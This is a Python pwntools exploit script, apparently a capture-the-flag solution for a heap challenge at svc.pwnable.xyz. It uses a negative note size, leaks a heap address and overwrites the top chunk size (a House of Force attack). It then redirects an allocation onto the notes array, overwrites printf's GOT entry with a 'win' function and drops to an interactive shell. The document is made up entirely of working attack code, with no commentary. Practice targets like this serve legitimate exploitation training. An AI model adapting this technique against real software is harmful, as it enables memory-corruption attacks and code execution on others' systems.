from pwn import *



def make_note(size, title, note):
    sh.sendlineafter('> ', '1')
    sh.sendlineafter(': ', str(size))
    sh.sendlineafter(': ', title)
    sh.sendlineafter(': ', note)


def edit_note(note, data):
    sh.sendlineafter('> ', '2')
    sh.sendlineafter(': ', str(note))
    sh.sendafter(': ', data)


def list_notes():
    sh.sendlineafter('> ', '3')



#sh = process('./challenge')
sh = remote('svc.pwnable.xyz',30041)
sh.sendlineafter('> ', '1')
sh.sendlineafter(': ', str(-1))
sh.sendlineafter(': ', 'AAAAAAAA')

make_note(16, "C"*0x1f, "D"*0xf)
edit_note(0, p64(0x0) + p64(0x31) + "H"*0x37 + "K")
list_notes()
print sh.recvuntil("K")

top_chunk = u64(sh.recvuntil(':')[:-1].ljust(8,'\x00')) + 0x20
print sh.recvline()
print "heap = ", hex(top_chunk)
edit_note(1, p64(0x0)*3 + p64(0x31) + "H"*0x20 + p64(0x0) + p64(0xffffffffffffffff))
notes = 0x6012a0
printf_got = 0x601218
win = 0x4008a2
evil_size = notes  - 40 - top_chunk
print "evil_size = ", hex(evil_size)
pause()
make_note(evil_size, p64(printf_got), "\x32")

pause()
sh.sendlineafter(': ', '0')
sh.sendafter(': ', p64(win))
pause()
#edit_note(0, p64(0x0) + p64(0x31) + "H"*0x20 + p64(0x0) + p64(0x0))

sh.interactive()



